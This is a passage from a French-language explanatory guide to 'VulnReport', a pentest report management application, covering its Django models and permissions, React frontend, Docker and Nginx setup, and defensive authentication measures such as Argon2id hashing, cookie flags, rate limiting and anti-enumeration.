- `models.py` : Definit le modele `User` personnalise avec un champ `role` (viewer, pentester, admin).
- `views.py` : 7 endpoints API (login, logout, register, me, users list, user detail, change-password).
- `permissions.py` : Classes de permission (`IsAdmin`, `IsPentester`, `IsOwnerOrAdmin`).
- `serializers.py` : Validation des donnees (mots de passe 12 caracteres min, email unique).
- `management/commands/seed_data.py` : Script qui cree les donnees initiales (3 utilisateurs, 15 fiches KB, rapports d'exemple).

**Fonctionnement du login** :
```
1. L'utilisateur envoie POST /api/auth/login/ avec {username, password}
2. Django appelle authenticate() qui :
   a. Cherche l'utilisateur dans la base de donnees
   b. Prend le hash Argon2id stocke en base
   c. Applique Argon2id au mot de passe envoye
   d. Compare les deux hash
3. Si les hash correspondent -> Django cree une session en base et envoie un cookie
4. Le cookie a les flags HttpOnly, Secure, SameSite=Strict
5. L'action est enregistree dans l'audit log
6. Reponse : {user: {id, username, role}, csrf_token}
```

#### App `reports` -- Rapports et Findings

**Responsabilite** : Gerer les rapports de pentest et les findings associes.

**Modeles** :
- `Report` : titre, contexte, resume executif, statut (draft/in_progress/finalized/published), proprietaire (FK vers User), dates de creation et modification.
- `Finding` : titre, description, preuve (PoC), impact, recommandation, references, severite (low/medium/high/critical), score CVSS, rapport parent (FK vers Report), entree KB associee (FK optionnelle vers KBEntry).

**Fonctionnement de la creation d'un finding depuis la KB** :
```
1. Le pentester consulte la KB et trouve "SQL Injection"
2. Il clique "Utiliser dans le rapport"
3. POST /api/reports/5/findings/ avec {title: "SQLi", kb_entry: 3}
4. Le serializer detecte kb_entry=3
5. Il va chercher la KBEntry et pre-remplit les champs vides :
   - description <- KB.description
   - recommendation <- KB.recommendation
   - references <- KB.references
   - severity <- KB.severity_default
6. Le pentester peut ensuite modifier ces champs pour son cas specifique
```

**Transitions de statut** :
```
draft --> in_progress --> finalized --> published
                                          ^
                                    (admin uniquement)
```
Un pentester peut faire progresser son rapport jusqu'a "finalise", mais seul un admin peut le publier. C'est une mesure de controle qualite.

#### App `kb` -- Base de Connaissance

**Responsabilite** : Gerer les fiches de vulnerabilites et les ressources pedagogiques.

**Modeles** :
- `KBEntry` : nom, description, recommandation, references (OWASP/CWE), severite par defaut, categorie (Injection, Auth, XSS, CSRF, etc.), dates de creation et modification.
- `Resource` : titre, URL, description, categorie. Liens vers des ressources pedagogiques (PortSwigger, WebGoat, Juice Shop, TryHackMe, cheatsheets OWASP).

**Permissions** :
- Lecture : accessible a tous les roles (Viewer, Pentester, Admin).
- Ecriture (CRUD) : reservee aux Admin uniquement.

#### App `audit` -- Journal d'Audit

**Responsabilite** : Enregistrer toutes les actions sensibles pour la tracabilite.

**Modele** : `AuditLog` avec :
- `actor_id` : L'utilisateur qui a effectue l'action (FK vers User).
- `action` : Le type d'action (login, create_report, delete_finding, etc.).
- `object_type` : Le type d'objet concerne (report, finding, kb_entry, etc.).
- `object_id` : L'identifiant de l'objet concerne.
- `timestamp` : La date et l'heure de l'action.
- `metadata` : Informations supplementaires au format JSON (titre, champs modifies, etc.).

**Particularites critiques** :
- **Immutable** : La methode `save()` est surchargee pour lever une erreur si on tente de modifier un enregistrement existant. On ne peut QUE creer de nouvelles entrees.
- **Non-supprimable** : La methode `delete()` leve toujours une erreur. On ne peut JAMAIS supprimer un log.
- **Acces restreint** : Seuls les administrateurs peuvent consulter les logs via `GET /api/audit/logs/`.

**Exemple d'utilisation dans le code** :
```python
from audit.utils import log_action

def perform_create(self, serializer):
    report = serializer.save(owner=self.request.user)
    log_action(
        actor=self.request.user,
        action='create_report',
        object_type='report',
        object_id=str(report.pk),
        metadata={'title': report.title}
    )
```

### Les modeles (tables) detailles

Voici le detail de chaque modele avec l'explication de chaque champ :

**User** (Utilisateur) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique, genere automatiquement |
| username | Texte | Nom d'utilisateur pour la connexion |
| email | Email | Adresse email unique |
| password_hash | Texte | Mot de passe hache avec Argon2id (jamais en clair) |
| role | Choix | viewer, pentester, ou admin |
| is_active | Booleen | Compte actif ou desactive |
| created_at | Date/heure | Date de creation du compte |

**Report** (Rapport) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique |
| title | Texte | Titre du rapport (obligatoire) |
| context | Texte long | Description du perimetre et des objectifs du pentest |
| executive_summary | Texte long | Resume pour les decideurs non techniques |
| status | Choix | draft, in_progress, finalized, published |
| created_at | Date/heure | Date de creation |
| updated_at | Date/heure | Date de derniere modification |
| owner_id | FK vers User | Le pentester proprietaire du rapport |

**Finding** (Vulnerabilite trouvee) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique |
| title | Texte | Titre de la vulnerabilite |
| description | Texte long | Description detaillee de la faille |
| proof | Texte long | Preuve d'exploitation (PoC) |
| impact | Texte long | Consequences si la faille est exploitee |
| recommendation | Texte long | Comment corriger la faille |
| references | Texte long | Liens OWASP, CWE, CVE |
| severity | Choix | low, medium, high, critical |
| cvss_score | Decimal | Score CVSS (0.0 a 10.0) |
| report_id | FK vers Report | Le rapport auquel ce finding est associe |
| kb_entry_id | FK vers KBEntry | La fiche KB utilisee (optionnel, nullable) |

**KBEntry** (Fiche de connaissance) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique |
| name | Texte | Nom de la vulnerabilite |
| description | Texte long | Description pedagogique |
| recommendation | Texte long | Recommandation standard |
| references | Texte long | Liens OWASP, CWE |
| severity_default | Choix | Severite par defaut (low/medium/high/critical) |
| category | Texte | Categorie (Injection, Auth, XSS, CSRF, etc.) |
| created_at | Date/heure | Date de creation |
| updated_at | Date/heure | Date de derniere modification |

**Resource** (Ressource pedagogique) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique |
| title | Texte | Titre de la ressource |
| url | URL | Lien vers la ressource |
| description | Texte | Description de la ressource |
| category | Texte | Categorie |

**AuditLog** (Journal d'audit) :
| Champ | Type | Description |
|-------|------|-------------|
| id | Entier auto | Identifiant unique |
| actor_id | FK vers User | Qui a fait l'action |
| action | Texte | Quel type d'action (login, create_report, etc.) |
| object_type | Texte | Quel type d'objet concerne (report, finding, etc.) |
| object_id | Texte | L'identifiant de l'objet concerne |
| timestamp | Date/heure | Quand l'action a eu lieu |
| metadata | JSON | Informations supplementaires (titre, champs modifies) |

### Qu'est-ce qu'un serializer ?

Un **serializer** dans Django REST Framework a deux roles :

1. **Serialisation** : Transformer un objet Python (par exemple, un objet Report) en JSON pour l'envoyer au client.
2. **Deserialisation + Validation** : Recevoir du JSON du client, le valider (verifier que les champs sont corrects, que les valeurs sont dans les limites autorisees), et le transformer en objet Python.

**Analogie** : Un serializer est comme un agent de douane a un aeroport. Quand des donnees entrent dans le systeme (arrivees), il verifie que tout est conforme (pas de contrebande, papiers en regle). Quand des donnees sortent (departs), il les emballe correctement.

**Exemple dans VulnReport** :

```python
class ReportSerializer(serializers.ModelSerializer):
    class Meta:
        model = Report
        fields = ['id', 'title', 'context', 'executive_summary', 'status', 'owner']

    def validate_title(self, value):
        if len(value) < 3:
            raise ValidationError("Le titre doit faire au moins 3 caracteres.")
        return value
```

Les serializers sont essentiels pour la securite car ils constituent la premiere ligne de defense contre les donnees malveillantes. Toute donnee recue du client passe par un serializer qui la valide avant qu'elle n'atteigne la base de donnees.

### Qu'est-ce qu'une vue API ?

Une **vue** (view) dans Django est une fonction ou une classe qui recoit une requete HTTP et retourne une reponse HTTP. C'est le "cerveau" de l'application -- c'est la vue qui decide quoi faire avec chaque requete.

**Comment Django traite une requete du debut a la fin** :

```
1. Le client envoie : GET /api/reports/5/
                           |
2. Nginx recoit la requete  |
   (reverse proxy)          |
                           v
3. Django recoit la requete via Gunicorn
                           |
4. Le systeme de routage   |
   (urls.py) determine     |
   quelle vue appeler      |
                           v
5. La vue ReportDetailView est appelee
                           |
6. Verification de         |
   l'authentification :    |
   le cookie de session    |
   est valide ?            |
                           v
7. Verification des        |
   permissions :           |
   l'utilisateur a-t-il   |
   le droit de voir ce     |
   rapport ?               |
                           v
8. Logique metier :        |
   recuperer le rapport    |
   depuis la base via ORM  |
                           v
9. Serialisation :         |
   transformer l'objet     |
   Report en JSON          |
                           v
10. Reponse envoyee :
    200 OK + JSON du rapport
```

### Qu'est-ce qu'une permission class ?

Dans Django REST Framework, une **permission class** est une classe qui decide si un utilisateur a le droit d'acceder a un endpoint. Elle est appelee automatiquement avant que la logique de la vue ne s'execute.

**Comment le RBAC est implemente dans VulnReport** :

```python
# permissions.py -- Classes de permission

class IsAdmin(permissions.BasePermission):
    """Seuls les admins peuvent acceder."""
    def has_permission(self, request, view):
        return request.user.role == 'admin'

class IsPentester(permissions.BasePermission):
    """Seuls les pentesters (et admins) peuvent acceder."""
    def has_permission(self, request, view):
        return request.user.role in ['pentester', 'admin']

class IsReportOwnerOrAdmin(permissions.BasePermission):
    """Seul le proprietaire du rapport ou un admin peut modifier."""
    def has_object_permission(self, request, view, obj):
        return obj.owner == request.user or request.user.role == 'admin'
```

Et dans les vues :

```python
class ReportDetailView(generics.RetrieveUpdateDestroyAPIView):
    permission_classes = [permissions.IsAuthenticated, IsReportOwnerOrAdmin]
    # => L'utilisateur doit etre connecte ET etre le proprietaire ou un admin
```

---

## 3.3 Le Frontend (React)

### Qu'est-ce que JavaScript ?

**JavaScript** est le langage de programmation du web. C'est le seul langage qui s'execute nativement dans les navigateurs. Quand vous voyez une page web interactive (menus deroulants, formulaires dynamiques, animations), c'est JavaScript qui est a l'oeuvre.

### Qu'est-ce que React ?

**React** est une bibliotheque JavaScript creee par Facebook (Meta) pour construire des interfaces utilisateur. React est la technologie la plus populaire pour les applications web modernes.

**Pourquoi React pour VulnReport ?**

1. **SPA (Single Page Application)** : L'application se charge une seule fois, puis tout se passe sans rechargement de page. C'est plus fluide pour l'utilisateur.
2. **Composants** : L'interface est decoupee en morceaux reutilisables.
3. **Ecosysteme riche** : React Router pour la navigation, Axios pour les appels API.
4. **Separation claire** : Le frontend et le backend sont deux applications distinctes qui communiquent via API REST.

### Qu'est-ce qu'une SPA (Single Page Application) ?

**Site web classique** : A chaque clic sur un lien, le navigateur envoie une requete au serveur, qui retourne une page HTML complete. Le navigateur doit recharger toute la page.

```
Clic sur "Rapports" --> Le serveur genere toute la page HTML --> Le navigateur recharge tout
Clic sur "KB"        --> Le serveur genere toute la page HTML --> Le navigateur recharge tout
```

**SPA (Single Page Application)** : Le navigateur charge l'application UNE SEULE FOIS (un fichier HTML + des fichiers JavaScript). Ensuite, quand l'utilisateur navigue, JavaScript met a jour SEULEMENT la partie de la page qui change, et fait des appels API pour recuperer les donnees necessaires.

```
Premier chargement --> Le navigateur charge toute l'application React (HTML + JS + CSS)
Clic sur "Rapports" --> React fait un appel API GET /api/reports/ --> Met a jour la page
Clic sur "KB"        --> React fait un appel API GET /api/kb/      --> Met a jour la page
```

**Avantage** : C'est beaucoup plus rapide et fluide car on ne recharge pas toute la page a chaque navigation.

### Qu'est-ce qu'un composant React ?

Un **composant** est un morceau d'interface reutilisable. C'est comme une brique LEGO : on construit une interface complexe en assemblant des composants simples.

**Analogie** : Imaginons une page web comme une maison. Un composant, c'est une piece de la maison (la cuisine, le salon, la chambre). Chaque piece a son propre role et peut etre reamenagee independamment sans affecter les autres.

**Le concept de state (etat)** : Le state est la memoire d'un composant. Par exemple, le composant `LoginPage` a un state qui contient le nom d'utilisateur et le mot de passe que l'utilisateur est en train de taper.

**Le concept de props (proprietes)** : Les props sont des donnees passees d'un composant parent a un composant enfant. Par exemple, le composant `App` (parent) passe l'information "l'utilisateur est connecte" au composant `Navbar` (enfant) pour qu'il affiche les bons boutons.

### Les pages de l'application

```
frontend/src/pages/
  LoginPage.js           --> Page de connexion
  Dashboard.js           --> Tableau de bord (compteurs adaptes au role)
  ReportListPage.js      --> Liste des rapports (filtres, recherche)
  ReportCreatePage.js    --> Formulaire de creation de rapport
  ReportDetailPage.js    --> Detail d'un rapport + ses findings
  KBListPage.js          --> Liste des fiches KB (filtres)
  KBDetailPage.js        --> Detail d'une fiche KB + bouton "Utiliser dans rapport"
  UserManagementPage.js  --> Gestion des utilisateurs (admin seulement)
  AuditLogPage.js        --> Consultation des logs d'audit (admin seulement)
```

### Comment React communique avec Django (Axios)

**Axios** est une bibliotheque JavaScript qui permet de faire des requetes HTTP depuis React. C'est le messager entre le frontend et le backend.

```javascript
// services/api.js -- Configuration d'Axios

const api = axios.create({
    baseURL: '/api',
    withCredentials: true,  // Envoie les cookies a chaque requete
});

// Intercepteur : ajoute automatiquement le token CSRF
api.interceptors.request.use(config => {
    config.headers['X-CSRFToken'] = getCookie('csrftoken');
    return config;
});
```

**Exemple d'appel API** :
```javascript
// Recuperer la liste des rapports
const response = await api.get('/reports/');
// response.data contient le JSON des rapports

// Creer un nouveau rapport
const newReport = await api.post('/reports/', {
    title: "Rapport Client Y",
    context: "Test d'intrusion du site web"
});
```

### Le theme dark cybersecurite

L'application utilise un theme sombre (dark mode) avec des couleurs inspirees de l'univers de la cybersecurite (vert neon sur fond sombre, badges colores pour les severites). Ce n'est pas juste esthetique : les pentesters travaillent souvent dans des environnements sombres et un theme dark reduit la fatigue visuelle.

---

## 3.4 La Base de Donnees (PostgreSQL)

### Qu'est-ce que PostgreSQL ?

**PostgreSQL** est un systeme de gestion de bases de donnees relationnelles (SGBDR) open source. C'est l'un des SGBDR les plus robustes et les plus utilises au monde.

**Analogie** : Si la base de donnees est un classeur, PostgreSQL est le systeme qui gere le classeur -- il sait comment ranger les dossiers, les retrouver, s'assurer que personne ne modifie un dossier pendant que quelqu'un d'autre le lit, etc.

### Pourquoi PostgreSQL et pas SQLite ?

**SQLite** est une base de donnees legere qui stocke tout dans un seul fichier. C'est bien pour le prototypage, mais pas pour la production :

| Critere | SQLite | PostgreSQL |
|---------|--------|------------|
| Multi-utilisateurs | Non (verrou sur tout le fichier) | Oui (acces concurrent) |
| Types de donnees avances | Limites | Complets (JSON, Array, etc.) |
| Contraintes d'integrite | Basiques | Avancees |
| Performance | Faible en ecriture multi | Elevee |
| ACID | Partiel | Complet |

Pour VulnReport, ou plusieurs utilisateurs peuvent acceder a l'application en meme temps, PostgreSQL est necessaire.

### Le schema de donnees : les 6 tables et leurs relations

```
+--------+       +--------+       +---------+
| User   |1-----*| Report |1-----*| Finding |
+--------+       +--------+       +---------+
| id (PK)|       | id (PK)|       | id (PK) |
| username|       | title  |       | title   |
| email  |       | context|       | descr.  |
| pass   |       | summary|       | severity|
| role   |       | status |       | cvss    |
| active |       | owner  |------>| report  |----> Report.id
+--------+       +--------+       | kb_entry|----> KBEntry.id (nullable)
    |                              +---------+
    |
    |            +---------+
    +1----------*| AuditLog|
    |            +---------+
    |            | id (PK) |
    |            | actor   |----> User.id
    |            | action  |
    |            | obj_type|
    |            | obj_id  |
    |            | timestamp|
    |            | metadata|
    |            +---------+
    |
    |            +---------+       +----------+
    |            | KBEntry |       | Resource |
    |            +---------+       +----------+
    |            | id (PK) |       | id (PK)  |
    |            | name    |       | title    |
    |            | descr.  |       | url      |
    |            | recomm. |       | descr.   |
    |            | severity|       | category |
    |            | category|       +----------+
    |            +---------+
```

**Legende** :
- `1-----*` signifie "un-a-plusieurs" (un User a plusieurs Reports)
- `----->` signifie "cle etrangere vers"
- `PK` = Primary Key (cle primaire)

### Les contraintes

- **Cles etrangeres (FK)** : Report.owner_id reference User.id (si on essaie de creer un rapport avec un owner_id qui n'existe pas, la base refuse).
- **NOT NULL** : Certains champs sont obligatoires (par exemple, Report.title ne peut pas etre vide).
- **UNIQUE** : Certains champs doivent etre uniques (par exemple, User.email ne peut pas etre en double).
- **Choix** : Les champs comme Report.status sont limites a un ensemble de valeurs autorisees (draft, in_progress, finalized, published).

### ACID : qu'est-ce que ca veut dire ?

**ACID** est un acronyme qui decrit les proprietes des transactions dans une base de donnees fiable :

- **A -- Atomicite** : Une transaction est "tout ou rien". Si une partie echoue, tout est annule. Analogie : un virement bancaire doit debiter ET crediter. Si le credit echoue, le debit est annule.

- **C -- Coherence** : La base de donnees passe toujours d'un etat valide a un autre etat valide. Les contraintes (FK, NOT NULL, etc.) sont toujours respectees.

- **I -- Isolation** : Les transactions concurrentes n'interferent pas entre elles. Si deux utilisateurs modifient la base en meme temps, chacun voit un etat coherent.

- **D -- Durabilite** : Une fois qu'une transaction est validee (committed), elle est sauvegardee de maniere permanente, meme en cas de panne.

PostgreSQL est entierement conforme ACID, ce qui garantit la fiabilite des donnees de VulnReport.

---

## 3.5 L'Architecture Docker

### Qu'est-ce que Docker ?

**Docker** est un outil qui permet de creer des **conteneurs** : des environnements isoles et portables pour executer des applications.

**Analogie** : Imaginons que vous demenagez. Au lieu de transporter chaque meuble separement en risquant de tout casser, vous mettez tout dans un container maritime standardise. Le container est le meme partout dans le monde, il se transporte de la meme facon, et tout est protege a l'interieur.

Un conteneur Docker, c'est pareil : il contient une application avec toutes ses dependances (systeme d'exploitation, bibliotheques, configuration), et il fonctionne de la meme facon sur n'importe quel ordinateur.

### Conteneurs vs Machines Virtuelles

| | Machine Virtuelle (VM) | Conteneur Docker |
|--|----------------------|-----------------|
| **Analogie** | Un appartement dans un immeuble (avec sa propre plomberie, electricite, etc.) | Un bureau dans un espace de coworking (les services sont partages) |
| **Systeme d'exploitation** | Chaque VM a son propre OS complet | Les conteneurs partagent le noyau de l'OS hote |
| **Poids** | Lourd (plusieurs Go) | Leger (quelques Mo) |
| **Demarrage** | Minutes | Secondes |
| **Isolation** | Tres forte | Forte (mais moins que les VM) |
| **Usage** | Quand on a besoin d'un OS different | Quand on veut juste isoler une application |

### Qu'est-ce qu'un Dockerfile ?

Un **Dockerfile** est un fichier texte qui contient les instructions pour construire une image Docker. C'est comme une recette de cuisine : chaque instruction est une etape.

**Exemple simplifie du Dockerfile backend** :
```dockerfile
# Etape 1 : Partir d'une image Python legere
FROM python:3.12-slim

# Etape 2 : Creer un utilisateur non-root (securite)
RUN useradd -m vulnreport

# Etape 3 : Copier les dependances et les installer
COPY requirements.txt .
RUN pip install -r requirements.txt

# Etape 4 : Copier le code source
COPY backend/ /app/

# Etape 5 : Passer a l'utilisateur non-root
USER vulnreport

# Etape 6 : Lancer le serveur
CMD ["gunicorn", "vulnreport.wsgi", "--bind", "0.0.0.0:8000"]
```

### Qu'est-ce que docker-compose ?

**docker-compose** est un outil qui permet de definir et de lancer **plusieurs conteneurs** en meme temps. C'est comme un chef d'orchestre qui coordonne les differents musiciens (conteneurs).

Au lieu de lancer chaque conteneur manuellement, on definit tous les services dans un fichier `docker-compose.yml` et on lance tout avec une seule commande : `docker compose up`.

### Les 4 conteneurs de VulnReport

```
+----------------------------------------------------------+
|                   Machine hote                           |
|                                                          |
|  +----------------------------------------------------+  |
|  |           Reseau Docker : vulnreport-net           |  |
|  |                                                    |  |
|  |  +-----------+  +------------+  +-----------+      |  |
|  |  |  Nginx    |  | Backend    |  | Frontend  |      |  |
|  |  |  (port 80)|  | Django     |  | React     |      |  |
|  |  |  Exposed  |  | (port 8000)|  | (Nginx    |      |  |
|  |  |  to host  |  | Internal   |  | interne)  |      |  |
|  |  +-----------+  +-----+------+  +-----------+      |  |
|  |       |               |                             |  |
|  |       |         +-----+------+                      |  |
|  |       |         | PostgreSQL |                      |  |
|  |       |         | (port 5432)|                      |  |
|  |       |         | Internal   |                      |  |
|  |       |         +------------+                      |  |
|  +----------------------------------------------------+  |
+----------------------------------------------------------+
```

1. **vulnreport-db (PostgreSQL 16 Alpine)** :
   - Stocke toutes les donnees.
   - Configure en `read_only: true` (ecriture uniquement dans les tmpfs).
   - Healthcheck toutes les 10 secondes (`pg_isready`).
   - Accessible uniquement depuis le reseau Docker interne.

2. **vulnreport-backend (Django + Gunicorn)** :
   - Execute l'API REST.
   - Tourne avec un utilisateur non-root (`vulnreport`).
   - Configure en `read_only: true`.
   - Attend que PostgreSQL soit healthy avant de demarrer.
   - Execute les migrations et le seed au demarrage.

3. **vulnreport-frontend (React build + Nginx)** :
   - Application React pre-construite (fichiers statiques HTML/JS/CSS).
   - Servie par un Nginx interne.
   - Configure en `read_only: true`.

4. **vulnreport-nginx (Reverse Proxy)** :
   - Seul conteneur expose au reseau externe (port 80).
   - Route les requetes vers le backend ou le frontend.
   - Ajoute les headers de securite.
   - Applique le rate limiting.

### Comment ils communiquent (reseau Docker bridge)

Tous les conteneurs sont connectes a un **reseau Docker bridge** nomme `vulnreport-net`. Ce reseau isole les conteneurs du monde exterieur tout en leur permettant de communiquer entre eux par leurs noms de service.

**Analogie** : C'est comme un reseau telephonique interne dans une entreprise. Les employes (conteneurs) peuvent s'appeler entre eux par leur nom (le backend appelle `db:5432` pour joindre PostgreSQL), mais depuis l'exterieur, on ne peut joindre que le standard telephonique (Nginx, port 80).

### Pourquoi seulement Nginx est expose (securite)

C'est le **principe du moindre privilege** applique au reseau. Si un attaquant compromet le reverse proxy Nginx, il n'a pas directement acces a la base de donnees ou au backend. Il doit d'abord traverser une couche supplementaire.

De plus, Nginx agit comme un filtre : il refuse les requetes malformees, applique le rate limiting, et ajoute les headers de securite AVANT que la requete n'atteigne Django.

---

## 3.6 Nginx (Reverse Proxy)

### Qu'est-ce qu'un reverse proxy ?

Un **proxy** est un intermediaire entre un client et un serveur. Un **reverse proxy** est un proxy qui se place devant les serveurs pour :

1. **Cacher les serveurs** : Le client ne sait pas combien de serveurs existent ni comment ils sont organises. Il ne voit que le reverse proxy.
2. **Repartir la charge** : En production, le reverse proxy peut distribuer les requetes entre plusieurs serveurs.
3. **Securiser** : Le reverse proxy ajoute des headers de securite, applique le rate limiting, et peut terminer le TLS (HTTPS).

**Analogie** : C'est comme la receptionniste d'un hotel. Les clients (navigateurs) ne vont pas directement dans les chambres (serveurs). Ils passent par la reception (reverse proxy) qui les oriente vers la bonne chambre et s'assure qu'ils ont le droit d'y aller.

### Comment Nginx route les requetes

La configuration de Nginx dans VulnReport est simple :

```
Si l'URL commence par /api/ ou /gestion-securisee/
    --> Rediriger vers le backend Django (port 8000)

Sinon (toutes les autres URL)
    --> Servir le frontend React (fichiers statiques)
```

Concretement :
- `http://localhost/api/reports/` --> Django traite la requete API.
- `http://localhost/dashboard` --> React affiche la page du dashboard.
- `http://localhost/gestion-securisee/` --> Django affiche l'interface d'administration.

### Les headers de securite ajoutes par Nginx

Nginx ajoute automatiquement ces headers a chaque reponse :

| Header | Valeur | Explication |
|--------|--------|-------------|
| `X-Frame-Options` | `DENY` | Interdit d'integrer le site dans un iframe (protection contre le clickjacking). |
| `X-Content-Type-Options` | `nosniff` | Empeche le navigateur de "deviner" le type d'un fichier. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limite les informations envoyees dans le header Referer. |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Force HTTPS pendant 2 ans. |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; ...` | Restreint les sources de contenu autorisees. |
| `Permissions-Policy` | `camera=(), microphone=(), ...` | Desactive les APIs sensibles du navigateur. |

Le detail de chaque header est explique dans la Section 4.

### Le rate limiting

Nginx limite le nombre de requetes sur le endpoint de login :

```
limit_req_zone $binary_remote_addr zone=login_limit:10m rate=10r/s;

location /api/auth/login/ {
    limit_req zone=login_limit burst=5 nodelay;
    proxy_pass http://backend:8000;
}
```

Cela signifie : maximum 10 requetes par seconde par adresse IP sur le login, avec un burst de 5 (on tolere 5 requetes supplementaires d'un coup). Au-dela, Nginx retourne une erreur 429 (Too Many Requests).

---

# SECTION 4 : LA SECURITE EN DETAIL

Cette section est la plus importante pour la soutenance. Elle detaille chaque mesure de securite implementee dans VulnReport.

---

## 4.1 L'authentification

### Qu'est-ce que l'authentification ?

L'**authentification** est le processus qui consiste a **prouver qui on est**. C'est la reponse a la question "Qui etes-vous ?".

**Analogie** : C'est comme montrer sa carte d'identite a un agent de securite. La carte prouve votre identite.

A ne pas confondre avec l'**autorisation** qui repond a "Avez-vous le droit de faire cela ?". L'authentification vient AVANT l'autorisation : on verifie d'abord QUI vous etes, puis on verifie CE QUE vous avez le droit de faire.

### Le hashage de mots de passe

**Qu'est-ce que le hashage ?** Le hashage est une transformation mathematique a sens unique. On transforme un mot de passe en une chaine de caracteres apparemment aleatoire (le "hash"). La particularite cruciale : il est **impossible** de retrouver le mot de passe d'origine a partir du hash.

**Analogie** : C'est comme un mixeur. Vous pouvez mettre des fruits dans un mixeur et obtenir un smoothie, mais vous ne pouvez pas reconstituer les fruits a partir du smoothie.

**Pourquoi ne jamais stocker un mot de passe en clair ?** Si la base de donnees est piratee (et ca arrive -- Yahoo, LinkedIn, Adobe, etc.), l'attaquant obtient la table des utilisateurs. Si les mots de passe sont en clair, il a acces a tous les comptes. Si les mots de passe sont haches, il n'a que des hash inutilisables.

### L'evolution des algorithmes de hashage

```
MD5 (1992) --> SHA256 (2001) --> bcrypt (1999) --> Argon2id (2015)
 CASSE         TROP RAPIDE       BON                LE MEILLEUR
```

**MD5** : Casse depuis longtemps. Des tables de correspondance (rainbow tables) permettent de retrouver le mot de passe en quelques secondes. JAMAIS utiliser MD5 pour les mots de passe.

**SHA256** : Plus robuste que MD5, mais trop rapide. Un attaquant avec un GPU puissant peut tester des milliards de hash par seconde. Le probleme n'est pas la securite du hash, mais sa vitesse.

**bcrypt** : Concu specialement pour les mots de passe. bcrypt est lent volontairement, ce qui rend les attaques par force brute beaucoup plus couteuses. C'est un bon choix.

**Argon2id** : Le gagnant du concours Password Hashing Competition (PHC) en 2015. C'est l'algorithme recommande par l'OWASP et le NIST. Argon2id combine :
- **Memory-hard** : Il consomme beaucoup de memoire (RAM), ce qui empeche l'utilisation de GPU/ASIC pour accelerer les attaques.
- **Time-hard** : Il prend du temps a calculer.
- **id** : La variante "id" combine les avantages d'Argon2i (resistante aux attaques par canal auxiliaire) et Argon2d (resistante aux attaques GPU).

**C'est pourquoi VulnReport utilise Argon2id** -- c'est le standard de l'industrie pour 2026.

### Les sessions : qu'est-ce qu'un cookie de session ?

HTTP est un protocole **sans etat** (stateless). Cela signifie que chaque requete est independante : le serveur ne "se souvient" pas des requetes precedentes. Alors comment le serveur sait-il que l'utilisateur est connecte ?

La reponse : les **sessions** et les **cookies**.

1. L'utilisateur se connecte (envoie username + password).
2. Le serveur verifie les identifiants et cree une **session** en base de donnees. La session contient un identifiant unique (par exemple `abc123`).
3. Le serveur envoie un **cookie** au navigateur. Ce cookie contient l'identifiant de session (`sessionid=abc123`).
4. A chaque requete suivante, le navigateur renvoie automatiquement le cookie.
5. Le serveur lit le cookie, retrouve la session en base, et sait qui est l'utilisateur.

**Analogie** : Un cookie de session, c'est comme un **bracelet de festival**. Quand vous arrivez au festival, vous montrez votre billet (login). On vous donne un bracelet (cookie). Ensuite, a chaque acces a une scene, vous montrez votre bracelet sans avoir a ressortir votre billet.

### Les flags de securite des cookies

Les cookies peuvent avoir des attributs de securite qui limitent leur utilisation :

**HttpOnly** : Empeche le JavaScript d'acceder au cookie.
- Sans HttpOnly : Un attaquant qui injecte du JavaScript (XSS) peut voler le cookie avec `document.cookie`.
- Avec HttpOnly : Le cookie est invisible pour JavaScript. Meme si un XSS est present, le cookie est protege.
- Analogie : C'est comme un bracelet de festival qui ne peut etre enleve. Meme si un pickpocket vous approche, il ne peut pas prendre votre bracelet.

**Secure** : Le cookie n'est envoye que sur des connexions HTTPS.
- Sans Secure : Le cookie est envoye meme sur HTTP (non chiffre). Un attaquant sur le reseau (WiFi public par exemple) peut intercepter le cookie.
- Avec Secure : Le cookie est envoye uniquement en HTTPS, donc chiffre en transit.
- Analogie : C'est comme envoyer une lettre dans une enveloppe scellee (HTTPS) au lieu d'une carte postale lisible par tous (HTTP).

**SameSite=Strict** : Le cookie n'est jamais envoye lors de requetes cross-site.
- Sans SameSite : Si l'utilisateur est connecte a VulnReport et qu'il visite un site malveillant, ce site peut declencher des requetes vers VulnReport en incluant le cookie (attaque CSRF).
- Avec SameSite=Strict : Le cookie n'est envoye que si la requete vient du meme site. Les requetes cross-site n'incluent pas le cookie.
- Analogie : C'est comme un badge d'entreprise qui ne fonctionne que dans votre entreprise. Si quelqu'un photocopie le badge et essaie de l'utiliser dans un autre batiment, ca ne marchera pas.

### Le rate limiting sur le login

Le rate limiting limite le nombre de tentatives de connexion par unite de temps. Dans VulnReport, c'est configure a deux niveaux :

1. **Niveau Django DRF** : 5 tentatives par minute par IP sur le scope `login`.
2. **Niveau Nginx** : 10 requetes par seconde avec un burst de 5 sur `/api/auth/login/`.

**Pourquoi 5 tentatives par minute ?** Un utilisateur legitime ne se trompe generalement pas plus de 2-3 fois. 5 tentatives offrent une marge confortable tout en bloquant les attaques par force brute (un attaquant a besoin de millions de tentatives).

**Pourquoi un double rate limiting (Django + Nginx) ?** C'est le principe de **defense en profondeur** : si une couche est contournee, la seconde est toujours active. Nginx bloque les rafales rapides (plus de 10/s), Django bloque les attaques lentes mais persistantes (plus de 5/min).

### L'anti-enumeration de comptes

L'**enumeration de comptes** est une technique ou l'attaquant essaie de decouvrir quels noms d'utilisateur existent dans le systeme.

**Mauvaise pratique** :
- Si l'utilisateur existe mais le mot de passe est faux : "Mot de passe incorrect"
- Si l'utilisateur n'existe pas : "Utilisateur inconnu"

Un attaquant peut tester des milliers de noms d'utilisateur et savoir lesquels existent.

**Bonne pratique (implementee dans VulnReport)** :
- Le meme message dans tous les cas : "Invalid credentials."
- Que l'utilisateur n'existe pas, que le mot de passe soit faux, ou que le compte soit desactive : toujours le meme message.

L'attaquant ne peut pas distinguer les trois cas.

---

## 4.2 Le controle d'acces (RBAC)

### Qu'est-ce que le RBAC ?

